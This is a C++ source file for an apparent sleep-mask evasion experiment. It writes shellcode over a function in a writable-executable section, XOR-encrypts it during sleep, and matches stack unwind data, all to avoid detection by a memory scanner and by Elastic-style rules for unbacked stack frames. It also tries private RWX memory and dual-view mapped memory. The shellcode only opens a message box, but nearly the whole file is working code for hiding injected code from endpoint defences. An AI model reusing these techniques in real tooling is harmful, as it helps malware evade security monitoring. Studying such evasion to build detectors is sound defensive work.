// bypass.exe — integrated single-file sleep-mask experiment.
// StubSleep (.stb), the stomp target (.pay) and g_shared are compiled into
// this exe; double-click runs the island experiment then an interactive menu.
// Modes: -full (control, detected), -idle, -scan, -walk/-walkpriv/-walkmap
// (stack classification arms), -msgtest, -desktop.

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// ---------------- compiler portability (MSVC vs MinGW-w64) ----------------
#if defined(__GNUC__)
#define NOINLINE __attribute__((noinline))
#define PAY_SEG  __attribute__((section(".pay")))
#define STB_SEG  __attribute__((section(".stb")))
#define WSPRINTF swprintf
#define WCPY     wcscpy
#define WCAT     wcscat
// Declare .pay as RWX ("awx") BEFORE GCC emits its own "ax" for the section:
// GAS keeps the FIRST declaration's attributes, so .pay maps writable and
// the sleep-mask needs no VirtualProtect. .stb stays "ax" (RX).
__asm__(".section .pay,\"awx\"\n\t.section .stb,\"ax\"\n\t.text");
#else
#define NOINLINE __declspec(noinline)
#define PAY_SEG
#define STB_SEG
#define WSPRINTF swprintf_s
#define WCPY     wcscpy_s
#define WCAT     wcscat_s
// .pay is linked RWX (execute|read|write) so the sleep-mask engine and the
// stomp need ZERO VirtualProtect calls — the loader maps it writable from
// the start. .stb stays RX (StubSleep never modifies itself).
#pragma section(".pay", execute, read, write)
#pragma section(".stb", execute, read)
#endif

// ---------------- victim module (formerly victim.dll) ----------------

typedef struct Shared {
    ULONGLONG shellBase;
    ULONGLONG islandStart;
    ULONGLONG writeBase;   // dual-view: RW alias of the payload pages
    ULONG     sleepMs;
    ULONG     key;
    ULONG     fullEncrypt;
    ULONG     walkFrames;   // 1 = classify stack frames (Elastic-style)
    ULONG     calls;
    ULONG     lastResult;
    ULONG     reserved;
} Shared;

static volatile Shared g_shared = {0, 0, 0, 8000, 0xA5, 0, 0, 0, 0, 0};

// dual-view (walkmap) handles: [0]=section, [1]=RW view (write alias)
static HANDLE g_mapHandles[2] = {0, 0};

static void MarkStage(const char* s); // defined below; used by StubSleep

// ---------------- Elastic-style stack classification ----------------
// Reproduces Elastic's "Unbacked" frame tag (a frame whose address resolves
// to no loaded executable image) and the call_stack_contains_unbacked
// verdict used by the suspicious-unbacked-memory behavior rules.
extern "C" USHORT WINAPI RtlCaptureStackBackTrace(ULONG framesToSkip,
                                                  ULONG framesToCapture,
                                                  PVOID* backTrace,
                                                  PULONG backTraceHash);

static const char* ProtName(DWORD p) {
    switch (p & 0xFF) {
        case PAGE_EXECUTE:           return "X";
        case PAGE_EXECUTE_READ:      return "RX";
        case PAGE_EXECUTE_READWRITE: return "RWX";
        case PAGE_READONLY:          return "R";
        case PAGE_READWRITE:         return "RW";
        case PAGE_NOACCESS:          return "NA";
        default:                     return "?";
    }
}

NOINLINE static void WalkAndClassify(void) {
    PVOID frames[40] = {0};
    USHORT n = RtlCaptureStackBackTrace(0, 40, frames, NULL);
    printf("[walk] captured %u frames\n", (int)n);
    ULONG unbacked = 0;
    for (USHORT i = 0; i < n && i < 40; i++) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T cb = VirtualQuery(frames[i], &mbi, sizeof(mbi));
        const char* type = "?";
        int isImage = 0;
        if (cb && mbi.State == MEM_COMMIT) {
            if (mbi.Type == MEM_IMAGE)      { type = "IMAGE";   isImage = 1; }
            else if (mbi.Type == MEM_PRIVATE) type = "PRIVATE";
            else if (mbi.Type == MEM_MAPPED)  type = "MAPPED";
            else type = "OTHER";
        }
        wchar_t mod[MAX_PATH] = L"";
        const wchar_t* shortMod = L"?";
        ULONGLONG off = 0;
        if (isImage) {
            GetModuleFileNameW((HMODULE)mbi.AllocationBase, mod, MAX_PATH);
            wchar_t* slash = wcsrchr(mod, L'\\');
            shortMod = slash ? slash + 1 : mod;
            off = (ULONGLONG)frames[i] - (ULONGLONG)mbi.AllocationBase;
        } else {
            unbacked++;
        }
        printf("[walk] %02u 0x%p %-22ls+0x%llX %-8s %-6s %s\n",
               (unsigned)i, frames[i], shortMod, off, type,
               cb ? ProtName(mbi.Protect) : "?", isImage ? "backed" : "UNBACKED");
    }
    printf("[walk] unbacked_frames=%lu -> Elastic predicate "
           "call_stack_contains_unbacked=%s\n", unbacked,
           unbacked ? "TRUE (rule would match)" : "false (rule silent)");
}

// Stomp target. 30 noinline calls force a non-leaf frame (~0xA9 bytes) with
// the minimal `sub rsp,<imm8>` prologue; the shellcode replicates the imm8
// (patched by the loader) so .pdata unwind codes match the real stack usage.
#if defined(_MSC_VER)
#pragma code_seg(".pay") // MSVC places functions via pragma; GCC via attributes
#endif
PAY_SEG NOINLINE static void DummyCall(void) { g_shared.reserved++; }

PAY_SEG NOINLINE static void StompTarget(void) {
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    g_shared.reserved = 0x12345678;
}

// Sleep-mask engine: encrypt [shellBase, islandStart) -> SleepEx -> decrypt.
// .pay is linked RWX, so the XOR works in place — no VirtualProtect, no
// syscall, zero protection-related API calls. StubSleep itself lives in .stb
// (RX, separate page) and is never encrypted.
#if defined(_MSC_VER)
#pragma code_seg(".stb")
#endif
STB_SEG NOINLINE static void StubSleep(void) {
    ULONGLONG start  = g_shared.shellBase;
    ULONGLONG island = g_shared.islandStart;
    if (island <= start) {
        island = start + 0x10;
    }
    size_t encLen = (size_t)(island - start);
    if (g_shared.fullEncrypt) {
        encLen += 0x40; // also cover the preserved window (control mode)
    }

    BYTE digest[4];
    memcpy(digest, (const void*)start, sizeof(digest));

    BYTE* p = (BYTE*)(g_shared.writeBase ? g_shared.writeBase : start);
    const BYTE key = (BYTE)g_shared.key;

    MarkStage("stage: stub before encrypt");
    for (size_t i = 0; i < encLen; i++) {
        p[i] ^= key; // direct write into the RWX-mapped image section
    }
    MarkStage("stage: stub before sleep");
    if (g_shared.walkFrames) {
        WalkAndClassify(); // classify the frames the scanner would see
    }
    SleepEx(g_shared.sleepMs, FALSE); // <- detector scans the process here
    MarkStage("stage: stub after sleep");

    for (size_t i = 0; i < encLen; i++) {
        p[i] ^= key;
    }

    g_shared.lastResult =
        (memcmp((const void*)start, digest, sizeof(digest)) == 0) ? 1 : 0;
}
#if defined(_MSC_VER)
#pragma code_seg() // back to default .text for the loader code
#endif

// ---------------- PIC shellcode (see comments for layout) ----------------
//
//  0x00: 48 83 EC 28          sub rsp, 0x28        (imm8 patched to match .pdata)
//  0x04: 90 x34               nop filler
//  0x26: 8B 05 [A]            mov eax, [rip+d]     ; d -> &g_shared.reserved
//  0x2C: 89 44 24 20          mov [rsp+0x20], eax  ; scoring op (rsp operand)
//  0x30: E8 [B]               call StubSleep       ; <- call site (ret = 0x35)
//  0x35: 8B 05 [C] / FF C0 / 89 05 [D]             ; g_shared.calls++ after wake
//  0x43: 48 8D 15 [E]         lea rdx, [rip+d]     ; d -> text string
//  0x4A: 4C 8D 05 [F]         lea r8,  [rip+d]     ; d -> caption string
//  0x51: 45 33 C9 / 33 C9                          ; MB_OK, hwnd = NULL
//  0x56: 48 B8 [G]            mov rax, imm64       ; MessageBoxA (patched)
//  0x60: FF D0                call rax
//  0x62: 89 05 [H]            mov [rip+d], eax     ; d -> &g_shared.reserved
//  0x68: 48 83 C4 28          add rsp, 0x28        (imm8 patched)
//  0x6C: C3                   ret
//  0x6D: "SleepMask Bypass Demo\0"    (caption; NUL at 0x82)
//  0x83: "Hello from PIC shellcode\0" (text)
// total 0x9B bytes of code+strings (declared [0x9D], trailing zero padding);
// scan window = [0x15, 0x3D) stays plaintext while sleeping
static const unsigned char kShellcode[0x9D] = {
    0x48, 0x83, 0xEC, 0x28,                               // 0x00
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x04
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x0C
    // 0x15-0x25: scoring filler (sub rsp,0 x5 + nop) so the detector's
    // disasm window scores >=2 from the window origin — slide distance 0
    0x90, 0x48, 0x83, 0xEC, 0x00, 0x48, 0x83, 0xEC,       // 0x14
    0x00, 0x48, 0x83, 0xEC, 0x00, 0x48, 0x83, 0xEC,       // 0x1C
    0x00, 0x90,                                           // 0x24
    0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x26 slot A
    0x89, 0x44, 0x24, 0x20,                               // 0x2C
    0xE8, 0x00, 0x00, 0x00, 0x00,                         // 0x30 slot B
    0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x35 slot C
    0xFF, 0xC0,                                           // 0x3B
    0x89, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x3D slot D
    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,             // 0x43 slot E
    0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x4A slot F
    0x45, 0x33, 0xC9,                                     // 0x51
    0x33, 0xC9,                                           // 0x54
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00,                                                 // 0x56 slot G (imm64)
    0xFF, 0xD0,                                           // 0x60
    0x89, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x62 slot H (result store)
    0x48, 0x83, 0xC4, 0x28,                               // 0x68
    0xC3,                                                 // 0x6C
    // 0x6D caption
    'S', 'l', 'e', 'e', 'p', 'M', 'a', 's', 'k', ' ', 'B', 'y', 'p', 'a',
    's', 's', ' ', 'D', 'e', 'm', 'o', 0,
    // 0x83 text
    'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'P', 'I', 'C',
    ' ', 's', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', 0
};

// patch a disp32 slot: slotOff = end of the instruction containing the disp
static void PatchSlot(unsigned char* shell, ULONGLONG shellBase, size_t slotOff,
                      ULONGLONG target) {
    ULONG disp = (ULONG)(target - (shellBase + slotOff));
    memcpy(shell + (slotOff - 4), &disp, sizeof(disp));
}

// ---------------- detector integration ----------------

static wchar_t g_detectorPath[MAX_PATH];
static int g_detectorFound = 0;

static int FindDetector(const wchar_t* overridePath) {
    if (overridePath && overridePath[0]) {
        if (GetFileAttributesW(overridePath) != INVALID_FILE_ATTRIBUTES) {
            WCPY(g_detectorPath, overridePath);
            g_detectorFound = 1;
            return 0;
        }
        printf("[-] detector not found at: %ls\n", overridePath);
    }
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    wchar_t* slash = wcsrchr(self, L'\\');
    if (slash) *slash = 0;

    wchar_t cand[3][MAX_PATH];
    WSPRINTF(cand[0], MAX_PATH, L"%ls\\sleep_duck.exe", self);       // exe dir
    WSPRINTF(cand[1], MAX_PATH, L"%ls\\..\\sleep_duck.exe", self);   // parent dir
    GetCurrentDirectoryW(MAX_PATH, cand[2]);
    WCAT(cand[2], L"\\sleep_duck.exe");                             // cwd
    for (int i = 0; i < 3; i++) {
        if (GetFileAttributesW(cand[i]) != INVALID_FILE_ATTRIBUTES) {
            WCPY(g_detectorPath, cand[i]);
            g_detectorFound = 1;
            return 0;
        }
    }
    printf("[-] sleep_duck.exe not found (looked next to exe, parent dir, cwd)\n");
    return -1;
}

static HANDLE SpawnDetector(DWORD pid, const wchar_t* outFile) {
    wchar_t cmd[1024];
    WSPRINTF(cmd, 1024, L"\"%ls\" -pid %lu", g_detectorPath, pid);

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE; // child's std handles must be inheritable
    HANDLE hOut = CreateFileW(outFile, GENERIC_WRITE, FILE_SHARE_READ, &sa,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        printf("[-] cannot create output file\n");
        return NULL;
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hOut;
    si.hStdError = hOut;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        CloseHandle(hOut);
        return NULL;
    }
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("[spawn] detector pid=%lu initial exit code=%lu\n", pi.dwProcessId,
           exitCode);
    CloseHandle(hOut);
    CloseHandle(pi.hThread);
    return pi.hProcess;
}

static void PrintDetectorOutput(const wchar_t* outFile) {
    HANDLE hIn = CreateFileW(outFile, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) {
        printf("(no detector output)\n");
        return;
    }
    char buf[4096];
    DWORD rd = 0;
    printf("----- detector output -----\n");
    while (ReadFile(hIn, buf, sizeof(buf) - 1, &rd, NULL) && rd > 0) {
        buf[rd] = 0;
        printf("%s", buf);
    }
    printf("---------------------------\n");
    CloseHandle(hIn);
}

// ---------------- experiment ----------------

static void MarkStage(const char* s) {
    HANDLE h = CreateFileA("stage.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(h, s, (DWORD)strlen(s), &w, NULL);
        WriteFile(h, "\r\n", 2, &w, NULL);
        CloseHandle(h);
    }
}

// unbuffered hex dump (crash-safe): writes to stage.txt like MarkStage
static void MarkStageHex(const char* tag, const void* p, size_t n) {
    HANDLE h = CreateFileA("stage.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(h, tag, (DWORD)strlen(tag), &w, NULL);
    WriteFile(h, " ", 1, &w, NULL);
    const unsigned char* b = (const unsigned char*)p;
    char line[96];
    for (size_t i = 0; i < n; i += 16) {
        size_t k = 0;
        for (size_t j = 0; j < 16 && i + j < n; j++) {
            k += (size_t)sprintf_s(line + k, sizeof(line) - k, "%02X ",
                                   b[i + j]);
        }
        line[k] = 0;
        WriteFile(h, line, (DWORD)k, &w, NULL);
        WriteFile(h, "\r\n", 2, &w, NULL);
    }
    CloseHandle(h);
}

static int RunExperiment(const wchar_t* mode) {
    MarkStage("stage: begin");
    ULONGLONG shellBase = (ULONGLONG)(uintptr_t)&StompTarget;

    // walkpriv = control arm: same payload in a PRIVATE RWX allocation.
    // walkmap = dual-view arm: RW view + RX view over one section (no RWX
    // page, but RX frames are MEM_MAPPED — the classification question).
    int priv = (wcscmp(mode, L"walkpriv") == 0);
    // walkmap = dual-view arm: one section, two views — RW view for writes,
    // RX view for execution. No page in the process is RWX, but the RX-view
    // frames are MEM_MAPPED, not MEM_IMAGE: does a stack classifier still
    // treat them as backed?
    int mapmode = (wcscmp(mode, L"walkmap") == 0);
    BYTE* execBase = (BYTE*)(uintptr_t)shellBase;
    if (priv) {
        // E8 rel32 is 32-bit: the copy must live within +-2GB of the image.
        ULONGLONG image = (ULONGLONG)(uintptr_t)&StompTarget;
        LONGLONG probes[] = { -0x100000LL, -0x400000LL, -0x1000000LL,
                              -0x4000000LL, -0x10000000LL, 0x100000LL,
                              0x400000LL,  0x1000000LL,  0x4000000LL };
        for (int k = 0; k < (int)(sizeof(probes) / sizeof(probes[0])); k++) {
            ULONGLONG cand = image + probes[k];
            LONGLONG d = (LONGLONG)(uintptr_t)&StubSleep -
                         ((LONGLONG)cand + 0x35);
            if (d < INT32_MIN || d > INT32_MAX) continue;
            execBase = (BYTE*)VirtualAlloc((LPVOID)cand, 0x2000,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_EXECUTE_READWRITE);
            if (execBase) {
                printf("[walkpriv] payload runs from %p (PRIVATE RWX = "
                       "unbacked)\n", execBase);
                break;
            }
        }
        if (!execBase) {
            printf("[-] could not allocate private buffer within +-2GB of "
                   "the image\n");
            return 1;
        }
        shellBase = (ULONGLONG)(uintptr_t)execBase;
    } else if (mapmode) {
        // Two simultaneous views over one section: RW view for writes, RX
        // view for execution — no protection flips. RX view must sit within
        // +-2GB of the image for the shellcode's E8 rel32 to StubSleep.
        ULONGLONG image = (ULONGLONG)(uintptr_t)&StompTarget;
        HANDLE hMap = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                                         PAGE_EXECUTE_READWRITE, 0, 0x2000,
                                         NULL);
        if (!hMap) {
            printf("[-] CreateFileMapping failed: %lu\n", GetLastError());
            return 1;
        }
        BYTE* rwView = (BYTE*)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0x2000);
        if (!rwView) {
            printf("[-] MapViewOfFile(RW) failed: %lu\n", GetLastError());
            return 1;
        }
        BYTE* rxView = NULL;
        LONGLONG probes[] = { -0x100000LL, -0x400000LL, -0x1000000LL,
                              -0x4000000LL, -0x10000000LL, 0x100000LL,
                              0x400000LL,  0x1000000LL,  0x4000000LL };
        for (int k = 0; k < (int)(sizeof(probes) / sizeof(probes[0])); k++) {
            ULONGLONG cand = (image + probes[k]) & ~0xFFFFLL; // 64KB-aligned
            LONGLONG d = (LONGLONG)(uintptr_t)&StubSleep -
                         ((LONGLONG)cand + 0x35);
            if (d < INT32_MIN || d > INT32_MAX) continue;
            LPVOID rsv = VirtualAlloc((LPVOID)cand, 0x2000, MEM_RESERVE,
                                      PAGE_NOACCESS);
            if (!rsv) continue;
            rxView = (BYTE*)MapViewOfFileEx(hMap, FILE_MAP_EXECUTE, 0, 0,
                                            0x2000, rsv);
            if (rxView) break;
            printf("[walkmap] probe %p: MapViewOfFileEx failed %lu "
                   "(reserve ok)\n", (void*)cand, GetLastError());
            VirtualFree(rsv, 0, MEM_RELEASE);
        }
        if (!rxView) {
            printf("[-] could not map RX view within +-2GB of the image\n");
            return 1;
        }
        g_mapHandles[0] = hMap;
        g_mapHandles[1] = rwView;
        execBase = rxView;
        shellBase = (ULONGLONG)(uintptr_t)rxView;
        printf("[walkmap] RX view %p (MEM_MAPPED, X) <-> RW view %p "
               "(MEM_MAPPED, RW), same physical pages\n", rxView, rwView);
    }

    unsigned char shell[sizeof(kShellcode)];
    memcpy(shell, kShellcode, sizeof(shell));

    // adapt the shellcode's stack allocation to the compiled stomp target:
    // `sub rsp,<imm8>` -> mirror the imm8 in shellcode sub/add so .pdata
    // unwind codes match the actual stack usage during the scan
    {
        unsigned char origPro[4];
        memcpy(origPro, (const void*)&StompTarget, sizeof(origPro));
        if (!(origPro[0] == 0x48 && origPro[1] == 0x83 && origPro[2] == 0xEC)) {
            printf("[-] unexpected stomp-target prologue: %02X %02X %02X\n",
                   origPro[0], origPro[1], origPro[2]);
            return 1;
        }
        shell[0x03] = origPro[3]; // sub rsp, imm8
        shell[0x6B] = origPro[3]; // add rsp, imm8
        printf("[adapt] stomp-target prologue sub rsp,0x%02X (shellcode matches)\n",
               origPro[3]);
    }

    PatchSlot(shell, shellBase, 0x2C, (ULONGLONG)(uintptr_t)&g_shared.reserved);
    PatchSlot(shell, shellBase, 0x35, (ULONGLONG)(uintptr_t)&StubSleep);
    PatchSlot(shell, shellBase, 0x3B, (ULONGLONG)(uintptr_t)&g_shared.calls);
    PatchSlot(shell, shellBase, 0x43, (ULONGLONG)(uintptr_t)&g_shared.calls);
    PatchSlot(shell, shellBase, 0x4A, shellBase + 0x83); // text (lpText, rdx) — 'H' at +0x83
    PatchSlot(shell, shellBase, 0x51, shellBase + 0x6D); // caption (lpCaption -> title) — 'S' at +0x6D
    PatchSlot(shell, shellBase, 0x68, (ULONGLONG)(uintptr_t)&g_shared.reserved);

    // resolve MessageBoxA at load time (PIC shellcode has no imports)
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    FARPROC msgBox = hUser32 ? GetProcAddress(hUser32, "MessageBoxA") : NULL;
    if (!msgBox) {
        printf("[-] cannot resolve MessageBoxA\n");
        return 1;
    }
    ULONGLONG msgBoxAddr = (ULONGLONG)(uintptr_t)msgBox;
    memcpy(shell + 0x58, &msgBoxAddr, 8); // slot G (mov rax, imm64)
    printf("[adapt] MessageBoxA = 0x%llX\n", msgBoxAddr);

    // Stomp: .pay is linked RWX so this is a plain memcpy (no VirtualProtect
    // anywhere). walkpriv: private RWX buffer. walkmap: RW view (shared pages).
    BYTE* writeTarget = mapmode ? (BYTE*)g_mapHandles[1] : execBase;
    memcpy(writeTarget, shell, sizeof(shell));

    // self-check: the patched string offsets must match the template layout
    const char* capStr = (const char*)(shellBase + 0x6D);
    const char* txtStr = (const char*)(shellBase + 0x83);
    if (strcmp(capStr, "SleepMask Bypass Demo") != 0 ||
        strcmp(txtStr, "Hello from PIC shellcode") != 0) {
        printf("[-] string layout mismatch! caption=[%s] text=[%s]\n", capStr,
               txtStr);
        return 1;
    }
    printf("[adapt] strings OK: caption@+0x6D text@+0x83\n");

    ULONG ms = 8000;
    g_shared.shellBase = shellBase;
    g_shared.islandStart = shellBase + 0x15; // plaintext island starts at window base
    g_shared.sleepMs = ms;
    g_shared.key = 0xA5;
    g_shared.calls = 0;
    g_shared.lastResult = 0;
    g_shared.fullEncrypt = (wcscmp(mode, L"full") == 0) ? 1 : 0;
    g_shared.walkFrames = (wcscmp(mode, L"walk") == 0 || priv || mapmode) ? 1 : 0;
    g_shared.writeBase = mapmode ? (ULONGLONG)(uintptr_t)g_mapHandles[1] : 0;

    printf("[mode=%ls] pid=%lu StompTarget(shellcode)=%p\n", mode,
           GetCurrentProcessId(), (void*)shellBase);

    // dump the stomped bytes for layout verification
    {
        unsigned char raw[0xA0];
        memcpy(raw, (const void*)shellBase, sizeof(raw));
        printf("[layout] stomped shellcode:");
        for (int i = 0; i < (int)sizeof(raw); i++) {
            if (i % 16 == 0) printf("\n  %04X: ", i);
            printf("%02X ", raw[i]);
        }
        printf("\n");
        MarkStageHex("[layout] shellcode:", (const void*)shellBase, 0x9D);
    }

    wchar_t outFile[MAX_PATH];
    WSPRINTF(outFile, MAX_PATH, L"%ls\\detector_%ls.txt", L".", mode);

    // Spawn the detector first, then enter the sleep cycle: the detector's
    // init+scan (~2-4s) lands inside the 8s encrypted sleep window.
    HANDLE hDet = NULL;
    if (g_detectorFound) {
        hDet = SpawnDetector(GetCurrentProcessId(), outFile);
    } else {
        printf("[!] detector not available — skipping scan\n");
    }

    if (wcscmp(mode, L"idle") == 0) {
        SleepEx(ms, FALSE); // baseline: no payload call
        MarkStage("stage: idle sleep done");
    } else {
        MarkStage("stage: before shellcode");
        ((void (*)(void))shellBase)(); // shellcode: encrypt -> SleepEx -> decrypt
                                      // -> calls++ -> MessageBoxA -> ret
        MarkStage("stage: after shellcode");
    }

    if (hDet) {
        WaitForSingleObject(hDet, 30000);
        DWORD detExit = 0;
        GetExitCodeProcess(hDet, &detExit);
        printf("[spawn] detector exited with code %lu\n", detExit);
        CloseHandle(hDet);
    }
    MarkStage("stage: detector wait done");

    printf("[mode=%ls] payload calls=%lu lastResult=%lu (1 = decrypt verified) "
           "msgboxResult=%ld (0x%lX, -1 = failure, 1 = IDOK)\n",
           mode, g_shared.calls, g_shared.lastResult, (long)g_shared.reserved,
           (unsigned long)g_shared.reserved);
    PrintDetectorOutput(outFile);
    return 0;
}

// ---------------- main ----------------

int wmain(int argc, wchar_t** argv) {
    SetConsoleOutputCP(CP_UTF8);

    const wchar_t* detectorOverride = (argc > 2) ? argv[2] : NULL;
    FindDetector(detectorOverride);

    if (argc > 1 && wcscmp(argv[1], L"-scan") == 0) {
        if (!g_detectorFound) return 1;
        wchar_t outFile[MAX_PATH];
        WSPRINTF(outFile, MAX_PATH, L"%ls\\detector_scan.txt", L".");
        HANDLE hDet = SpawnDetector(GetCurrentProcessId(), outFile);
        if (hDet) {
            WaitForSingleObject(hDet, 30000);
            CloseHandle(hDet);
        }
        PrintDetectorOutput(outFile);
        return 0;
    }

    if (argc > 1 && wcscmp(argv[1], L"-desktop") == 0) {
        HWINSTA sta = GetProcessWindowStation();
        HDESK dsk = GetThreadDesktop(GetCurrentThreadId());
        wchar_t staName[256] = {0}, dskName[256] = {0};
        DWORD n = 0;
        GetUserObjectInformationW(sta, UOI_NAME, staName, sizeof(staName), &n);
        n = 0;
        GetUserObjectInformationW(dsk, UOI_NAME, dskName, sizeof(dskName), &n);
        DWORD pid = GetCurrentProcessId();
        DWORD sid = GetProcessId(GetCurrentProcess());
        printf("[desktop] pid=%lu winsta=%ls desktop=%ls\n", pid, staName, dskName);
        (void)sid;
        return 0;
    }

    if (argc > 1 && wcscmp(argv[1], L"-msgtest") == 0) {
        // sanity: does a direct MessageBoxA from this process show up?
        printf("[msgtest] calling MessageBoxA directly...\n");
        int r = MessageBoxA(NULL, "direct test", "direct test", MB_OK);
        printf("[msgtest] MessageBoxA returned %d\n", r);
        return 0;
    }

    if (argc > 1 && wcscmp(argv[1], L"-full") == 0) {
        RunExperiment(L"full");
        return 0;
    }
    if (argc > 1 && (wcscmp(argv[1], L"-walk") == 0 ||
                     wcscmp(argv[1], L"-walkpriv") == 0 ||
                     wcscmp(argv[1], L"-walkmap") == 0)) {
        RunExperiment(argv[1] + 1); // "walk" / "walkpriv" / "walkmap"
        return 0;
    }
    if (argc > 1 && wcscmp(argv[1], L"-idle") == 0) {
        RunExperiment(L"idle");
        return 0;
    }

    // default (double-click): island experiment, then interactive menu
    RunExperiment(L"island");

    printf("\n=============================================\n");
    printf(" 实验完成。菜单：\n");
    printf("  [1] 运行检测器扫描本进程（单独检测）\n");
    printf("  [2] 重跑实验组（island）\n");
    printf("  [3] 跑控制组（full，预期被检出）\n");
    printf("  [0] 退出\n");
    printf("=============================================\n");
    for (;;) {
        printf("> ");
        int c = getchar();
        if (c == EOF) break;
        if (c == '\n' || c == '\r') continue;
        if (c == '0') break;
        if (c == '1') {
            if (!g_detectorFound) {
                printf("[-] sleep_duck.exe 未找到\n");
                continue;
            }
            wchar_t outFile[MAX_PATH];
            WSPRINTF(outFile, MAX_PATH, L"%ls\\detector_menu.txt", L".");
            HANDLE hDet = SpawnDetector(GetCurrentProcessId(), outFile);
            if (hDet) {
                WaitForSingleObject(hDet, 30000);
                CloseHandle(hDet);
            }
            PrintDetectorOutput(outFile);
        } else if (c == '2') {
            RunExperiment(L"island");
        } else if (c == '3') {
            RunExperiment(L"full");
        }
    }
    return 0;
}
